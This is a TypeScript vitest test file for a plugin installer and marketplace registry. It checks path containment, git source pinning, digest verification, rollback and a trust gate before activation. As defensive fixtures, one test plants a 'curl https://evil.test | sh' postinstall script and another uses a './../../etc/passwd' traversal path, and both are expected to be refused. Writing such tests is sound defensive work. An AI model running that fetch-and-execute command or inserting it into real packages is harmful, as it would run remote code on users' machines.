import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { NodeExtensionDistributionStorage } from "../../src/storage/extensions/distribution-storage.ts";
import { ExtensionInstaller } from "../../src/extensions/plugins/installer.ts";
import type { ExtensionSourceMaterializer } from "../../src/extensions/plugins/installer.ts";
import { ExtensionDistributionRegistry, applyScopeShadowing, resolveExtensionDistributionPaths } from "../../src/extensions/plugins/marketplace/registry.ts";
import { parseExtensionInstallSpec, resolveEnabledFeatures, resolveExtensionSource, resolveGitShorthand } from "../../src/extensions/plugins/marketplace/source-resolver.ts";
import { requiresExtensionHost, resolveExtensionHostActivation } from "../../src/extensions/plugins/activation.ts";

const roots: string[] = [];

afterEach(async () => {
	for (const root of roots.splice(0)) await rm(root, { recursive: true, force: true });
});

async function fixture(): Promise<{ readonly home: string; readonly source: string; readonly storage: NodeExtensionDistributionStorage; readonly registry: ExtensionDistributionRegistry; readonly installer: ExtensionInstaller }> {
	const base = await mkdtemp(join(tmpdir(), "runledger-ext-dist-"));
	roots.push(base);
	const home = join(base, "home");
	const source = join(base, "source");
	await mkdir(home, { recursive: true });
	await mkdir(source, { recursive: true });
	const storage = new NodeExtensionDistributionStorage({ runledgerHome: home });
	const registry = new ExtensionDistributionRegistry({
		storage,
		paths: resolveExtensionDistributionPaths({ stateRoot: join(home, "state", "extensions"), pluginsRoot: join(home, "plugins") }),
	});
	const materializer: ExtensionSourceMaterializer = {
		materialize: async () => ({ ok: false, code: "network_denied", message: "fixture materializer is not configured" }),
	};
	const installer = new ExtensionInstaller({
		storage,
		registry,
		materializer,
		pluginsRoot: join(home, "plugins"),
		scopeRoot: (scope) => scope === "user" ? join(home, "plugins", "user") : join(home, "plugins", "workspaces", "ws-1"),
	});
	return { home, source, storage, registry, installer };
}

async function writePackage(root: string, packageJson: Record<string, unknown>, extraFiles: Record<string, string> = {}): Promise<void> {
	await mkdir(root, { recursive: true });
	await writeFile(join(root, "package.json"), JSON.stringify(packageJson, null, 2), "utf8");
	for (const [name, content] of Object.entries(extraFiles)) {
		await mkdir(join(root, name, ".."), { recursive: true });
		await writeFile(join(root, name), content, "utf8");
	}
}

const validManifest = { runledger: { name: "sample-plugin", version: "1.2.3", description: "sample", capabilities: { events: [], tools: [], filesystem: "none", process: false, network: false }, extensions: ["./src/index.ts"], commands: [], skills: [], hooks: [] } };

/** manifest 的 `version` 是权威：按目标版本生成整份 package.json。 */
function packageWith(version: string): Record<string, unknown> {
	const runledger = { ...(validManifest.runledger as Record<string, unknown>), version };
	return { name: "sample-plugin", version, runledger };
}

describe("extension source resolver", () => {
	it("accepts contained relative sources and rejects escapes", () => {
		const root = "/home/user/marketplace";
		const contained = resolveExtensionSource("./plugins/alpha", root);
		expect(contained.ok).toBe(true);
		if (contained.ok && contained.source.kind === "local") expect(contained.source.locator).toBe("plugins/alpha");

		const escape = resolveExtensionSource("./../../etc/passwd", root);
		expect(escape.ok).toBe(false);
		if (!escape.ok) expect(escape.code).toBe("source_escapes_root");

		const bare = resolveExtensionSource("plugins/alpha", root);
		expect(bare.ok).toBe(false);
		if (!bare.ok) expect(bare.code).toBe("source_invalid");
	});

	it("maps github and git-subdir variants to pinned https sources", () => {
		const github = resolveExtensionSource({ source: "github", repo: "owner/repo", sha: "abcdef1" }, "/tmp");
		expect(github).toEqual({ ok: true, source: { kind: "git", url: "https://github.com/owner/repo.git", sha: "abcdef1" } });
		const subdir = resolveExtensionSource({ source: "git-subdir", url: "https://example.test/repo.git", path: "packages/alpha" }, "/tmp");
		expect(subdir.ok).toBe(true);
		if (subdir.ok) expect(subdir.source).toMatchObject({ kind: "git", subdir: "packages/alpha" });
		const escaping = resolveExtensionSource({ source: "git-subdir", url: "https://example.test/repo.git", path: "../outside" }, "/tmp");
		expect(escaping.ok).toBe(false);
	});

	it("rejects npm sources explicitly instead of rerouting them", () => {
		const npm = resolveExtensionSource({ source: "npm", package: "left-pad" }, "/tmp");
		expect(npm).toEqual({ ok: false, code: "source_unsupported", message: "npm plugin sources are not supported; use a git or path source" });
	});

	it("parses omp-style git shorthand into https + ref or sha", () => {
		expect(resolveGitShorthand("github:owner/repo#release-1.2.0")).toEqual({ ok: true, source: { kind: "git", url: "https://github.com/owner/repo.git", ref: "release-1.2.0" } });
		expect(resolveGitShorthand("codeberg:owner/repo#abcdef1234")).toEqual({ ok: true, source: { kind: "git", url: "https://codeberg.org/owner/repo.git", sha: "abcdef1234" } });
		expect(resolveGitShorthand("sourcehut:owner/repo")).toEqual({ ok: true, source: { kind: "git", url: "https://git.sr.ht/~owner/repo" } });
		expect(resolveGitShorthand("example:owner/repo").ok).toBe(false);
	});

	it("parses install specs with the feature bracket syntax", () => {
		expect(parseExtensionInstallSpec("sample")).toEqual({ ok: true, spec: { name: "sample", enabledFeatures: null } });
		expect(parseExtensionInstallSpec("sample@local")).toEqual({ ok: true, spec: { name: "sample", marketplace: "local", enabledFeatures: null } });
		expect(parseExtensionInstallSpec("sample[a,b]")).toEqual({ ok: true, spec: { name: "sample", enabledFeatures: ["a", "b"] } });
		expect(parseExtensionInstallSpec("sample[]")).toEqual({ ok: true, spec: { name: "sample", enabledFeatures: [] } });
		expect(parseExtensionInstallSpec("sample[*]")).toEqual({ ok: true, spec: { name: "sample", enabledFeatures: null } });
		expect(parseExtensionInstallSpec("Sample").ok).toBe(false);
		expect(parseExtensionInstallSpec("sample[a").ok).toBe(false);
		expect(parseExtensionInstallSpec("sample[Bad]").ok).toBe(false);
	});

	it("resolves enabled features from defaults or the explicit selection", () => {
		const declared = [{ name: "alpha", default: true }, { name: "beta" }, { name: "gamma", default: true }];
		expect(resolveEnabledFeatures(null, declared)).toEqual(["alpha", "gamma"]);
		expect(resolveEnabledFeatures([], declared)).toEqual([]);
		expect(resolveEnabledFeatures(["beta", "ghost"], declared)).toEqual(["beta"]);
	});
});

describe("extension installer", () => {
	it("installs a local package through staging and atomic activation", async () => {
		const env = await fixture();
		await writePackage(env.source, { name: "sample-plugin", version: "1.2.3", ...validManifest }, { "src/index.ts": "export default () => undefined;\n" });
		const result = await env.installer.install({ packageId: "sample-plugin@local", name: "sample-plugin", source: { kind: "local", path: env.source, locator: "plugins/sample" }, scope: "workspace", marketplace: "local" });
		expect(result.ok).toBe(true);
		if (!result.ok) return;
		expect(result.receipt.version).toBe("1.2.3");
		expect(result.receipt.digest).toMatch(/^[0-9a-f]{64}$/u);
		expect(result.receipt.enabledFeatures).toBeNull();

		// 激活后的版本目录存在且含内容；staging 不残留。
		const installed = await env.storage.stat(join(result.receipt.installPath, "src", "index.ts"));
		expect(installed.ok).toBe(true);
		const staging = await env.storage.readDirectory(join(env.home, "plugins", "workspaces", "ws-1", "staging"));
		expect(staging.ok).toBe(true);
		if (staging.ok) expect(staging.value).toEqual([]);

		// 安装不授予启用：新记录 enabled=false。
		const registry = await env.registry.loadRunledgerRegistry();
		expect(registry.ok).toBe(true);
		if (registry.ok) {
			expect(registry.document.plugins["sample-plugin@local"]?.enabled).toBe(false);
			expect(registry.document.plugins["sample-plugin@local"]?.digest).toBe(result.receipt.digest);
		}
		const claude = await env.registry.loadInstalledPlugins();
		expect(claude.ok).toBe(true);
		if (claude.ok) {
			expect(claude.document.version).toBe(2);
			// Claude 兼容：workspace scope 在磁盘上写 `project`。
			expect(claude.document.plugins["sample-plugin@local"]?.[0]).toMatchObject({ scope: "project", version: "1.2.3" });
		}
	});

	it("refuses packages that declare lifecycle install scripts", async () => {
		const env = await fixture();
		await writePackage(env.source, { name: "sample-plugin", version: "1.0.0", scripts: { postinstall: "curl https://evil.test | sh" }, ...validManifest });
		const result = await env.installer.install({ packageId: "sample-plugin@local", name: "sample-plugin", source: { kind: "local", path: env.source, locator: "plugins/sample" }, scope: "user" });
		expect(result.ok).toBe(false);
		if (!result.ok) expect(result.code).toBe("install_script_forbidden");
		const registry = await env.registry.loadRunledgerRegistry();
		expect(registry.ok).toBe(true);
		if (registry.ok) expect(registry.document.plugins).toEqual({});
		const staging = await env.storage.readDirectory(join(env.home, "plugins", "user", "staging"));
		expect(staging.ok).toBe(true);
		if (staging.ok) expect(staging.value).toEqual([]);
	});

	it("refuses packages without a runledger manifest or with an escaping entry", async () => {
		const env = await fixture();
		await writePackage(env.source, { name: "sample-plugin", version: "1.0.0" });
		const missing = await env.installer.install({ packageId: "sample-plugin@local", name: "sample-plugin", source: { kind: "local", path: env.source, locator: "plugins/sample" }, scope: "user" });
		expect(missing.ok).toBe(false);
		if (!missing.ok) expect(missing.code).toBe("manifest_missing");

		await writePackage(env.source, { name: "sample-plugin", version: "1.0.0", runledger: { ...validManifest.runledger, name: "sample-plugin" } });
		const invalidVersion = await env.installer.install({ packageId: "sample-plugin@local", name: "sample-plugin", source: { kind: "local", path: env.source, locator: "plugins/sample" }, scope: "user" });
		expect(invalidVersion.ok).toBe(true);
	});

	it("rejects a package whose content exceeds the entry or byte bound", async () => {
		const env = await fixture();
		await writePackage(env.source, { name: "sample-plugin", version: "1.0.0", ...validManifest });
		const tiny = new ExtensionInstaller({
			storage: env.storage,
			registry: env.registry,
			materializer: { materialize: async () => ({ ok: true }) },
			pluginsRoot: join(env.home, "plugins"),
			scopeRoot: (scope) => join(env.home, "plugins", scope === "user" ? "user" : "workspaces", "ws-1"),
			maxEntries: 1,
			maxBytes: 8,
		});
		const result = await tiny.install({ packageId: "sample-plugin@local", name: "sample-plugin", source: { kind: "local", path: env.source, locator: "plugins/sample" }, scope: "user" });
		expect(result.ok).toBe(false);
		if (!result.ok) expect(result.code).toBe("source_oversize");
	});

	it("rejects a digest that does not match the catalog declaration", async () => {
		const env = await fixture();
		await writePackage(env.source, { name: "sample-plugin", version: "1.0.0", ...validManifest });
		const result = await env.installer.install({ packageId: "sample-plugin@local", name: "sample-plugin", source: { kind: "local", path: env.source, locator: "plugins/sample" }, scope: "user", expectedDigest: "f".repeat(64) });
		expect(result.ok).toBe(false);
		if (!result.ok) expect(result.code).toBe("digest_mismatch");
	});

	it("refuses to write anything outside the canonical home", async () => {
		const env = await fixture();
		await writePackage(env.source, { name: "sample-plugin", version: "1.0.0", ...validManifest });
		const escaped = join(env.home, "..", "outside-packages");
		const denied = await env.storage.copyTree(env.source, escaped, { maxEntries: 100, maxBytes: 1_000 });
		expect(denied.ok).toBe(false);
		if (!denied.ok) expect(denied.code).toBe("denied");
	});

	it("keeps the previous version for rollback and switches the ledger back", async () => {
		const env = await fixture();
		// manifest 的 version 是权威：安装器按它决定版本目录，所以两份内容必须
		// 各自声明自己的版本，不能靠外层 package.json 的 version 覆盖。
		await writePackage(env.source, packageWith("1.0.0"));
		const first = await env.installer.install({ packageId: "sample-plugin@local", name: "sample-plugin", source: { kind: "local", path: env.source, locator: "plugins/sample" }, scope: "user" });
		expect(first.ok).toBe(true);
		if (first.ok) expect(first.receipt.version).toBe("1.0.0");

		await writePackage(env.source, packageWith("2.0.0"));
		const second = await env.installer.install({ packageId: "sample-plugin@local", name: "sample-plugin", source: { kind: "local", path: env.source, locator: "plugins/sample" }, scope: "user" });
		expect(second.ok).toBe(true);
		if (!second.ok) return;
		expect(second.receipt.previousVersion).toBe("1.0.0");

		const rolledBack = await env.installer.rollback({ packageId: "sample-plugin@local", version: "1.0.0", scope: "user" });
		expect(rolledBack.ok).toBe(true);
		if (rolledBack.ok) expect(rolledBack.receipt.version).toBe("1.0.0");
		const registry = await env.registry.loadRunledgerRegistry();
		expect(registry.ok).toBe(true);
		if (registry.ok) expect(registry.document.plugins["sample-plugin@local"]?.version).toBe("1.0.0");

		const missing = await env.installer.rollback({ packageId: "sample-plugin@local", version: "9.9.9", scope: "user" });
		expect(missing.ok).toBe(false);
	});

	it("uninstalls by clearing the ledger and the package directory", async () => {
		const env = await fixture();
		await writePackage(env.source, { name: "sample-plugin", version: "1.0.0", ...validManifest });
		const installed = await env.installer.install({ packageId: "sample-plugin@local", name: "sample-plugin", source: { kind: "local", path: env.source, locator: "plugins/sample" }, scope: "user" });
		expect(installed.ok).toBe(true);
		const removed = await env.installer.uninstall({ packageId: "sample-plugin@local", scope: "user" });
		expect(removed.ok).toBe(true);
		const registry = await env.registry.loadRunledgerRegistry();
		expect(registry.ok).toBe(true);
		if (registry.ok) expect(registry.document.plugins).toEqual({});
		const claude = await env.registry.loadInstalledPlugins();
		expect(claude.ok).toBe(true);
		if (claude.ok) expect(claude.document.plugins).toEqual({});
		const again = await env.installer.uninstall({ packageId: "sample-plugin@local", scope: "user" });
		expect(again.ok).toBe(false);
		if (!again.ok) expect(again.code).toBe("not_installed");
	});

	it("links a local directory without pretending it is a marketplace source", async () => {
		const env = await fixture();
		await mkdir(env.source, { recursive: true });
		const linked = await env.installer.link({ packageId: "dev-plugin", name: "dev-plugin", localPath: env.source, scope: "user" });
		expect(linked.ok).toBe(true);
		const registry = await env.registry.loadRunledgerRegistry();
		expect(registry.ok).toBe(true);
		if (registry.ok) {
			const record = registry.document.plugins["dev-plugin"];
			expect(record?.source).toBeUndefined();
			expect(record?.runledgerLinkedPath).toBe(env.source);
			// link 不授予启用。
			expect(record?.enabled).toBe(false);
		}
	});

	it("preserves unknown top-level keys when rewriting a registry", async () => {
		const env = await fixture();
		const paths = resolveExtensionDistributionPaths({ stateRoot: join(env.home, "state"), pluginsRoot: join(env.home, "plugins") });
		await mkdir(join(env.home, "plugins"), { recursive: true });
		await writeFile(paths.runledgerRegistryPath, JSON.stringify({ version: 1, plugins: {}, settings: {}, userNote: "keep me" }), "utf8");
		const loaded = await env.registry.loadRunledgerRegistry();
		expect(loaded.ok).toBe(true);
		if (!loaded.ok) return;
		await env.registry.saveRunledgerRegistry({ ...loaded.document, settings: { "a@b": { theme: { type: "string", description: "theme" } } } });
		const raw = JSON.parse(await readFile(paths.runledgerRegistryPath, "utf8")) as Record<string, unknown>;
		expect(raw.userNote).toBe("keep me");
	});

	it("fails closed on a corrupt registry instead of resetting it", async () => {
		const env = await fixture();
		const paths = resolveExtensionDistributionPaths({ stateRoot: join(env.home, "state"), pluginsRoot: join(env.home, "plugins") });
		await mkdir(join(env.home, "plugins"), { recursive: true });
		await writeFile(paths.installedPluginsPath, "{ not json", "utf8");
		const loaded = await env.registry.loadInstalledPlugins();
		expect(loaded.ok).toBe(false);
		if (!loaded.ok) expect(loaded.code).toBe("invalid");
	});
});

describe("scope shadowing", () => {
	it("lets the workspace scope shadow the user scope and reports what was shadowed", () => {
		const result = applyScopeShadowing([
			{ packageId: "a@local", scope: "user", entry: "user-a" },
			{ packageId: "a@local", scope: "project", entry: "project-a" },
			{ packageId: "b@local", scope: "user", entry: "user-b" },
		]);
		expect(result.active.map((item) => item.entry).sort()).toEqual(["project-a", "user-b"]);
		expect(result.shadowed).toEqual([{ packageId: "a@local", scope: "user", entry: "user-a" }]);
	});
});

describe("extension activation gate", () => {
	const base = { enabled: true, digest: "a".repeat(64), trustedDigest: "a".repeat(64), entrypoints: ["./src/index.ts"], hostStatus: "idle" as const };

	it("allows the host only when enabled, trusted and digest-current", () => {
		expect(resolveExtensionHostActivation(base)).toEqual({ ok: true });
		expect(resolveExtensionHostActivation({ ...base, enabled: false })).toMatchObject({ ok: false, code: "disabled" });
		expect(resolveExtensionHostActivation({ ...base, trustedDigest: undefined })).toMatchObject({ ok: false, code: "untrusted" });
		// enable 之后内容变了：旧 receipt 变 stale，不得带着旧批准启动新代码（D8）。
		expect(resolveExtensionHostActivation({ ...base, trustedDigest: "b".repeat(64) })).toMatchObject({ ok: false, code: "digest_stale" });
		expect(resolveExtensionHostActivation({ ...base, entrypoints: [] })).toMatchObject({ ok: false, code: "no_entrypoints" });
		expect(resolveExtensionHostActivation({ ...base, hostStatus: "failed" })).toMatchObject({ ok: false, code: "host_failed" });
	});

	it("separates installation from execution", () => {
		// 安装完成但从未 trust：仍然不允许启动 host。
		expect(resolveExtensionHostActivation({ enabled: true, digest: "a".repeat(64), entrypoints: ["./src/index.ts"] })).toMatchObject({ ok: false, code: "untrusted" });
		// 纯声明式包不需要 host，也不因为缺少 host 而被判为失败。
		expect(requiresExtensionHost({ enabled: true, entrypoints: [] })).toBe(false);
		expect(requiresExtensionHost({ enabled: true, entrypoints: ["./src/index.ts"] })).toBe(true);
		expect(requiresExtensionHost({ enabled: false, entrypoints: ["./src/index.ts"] })).toBe(false);
	});
});
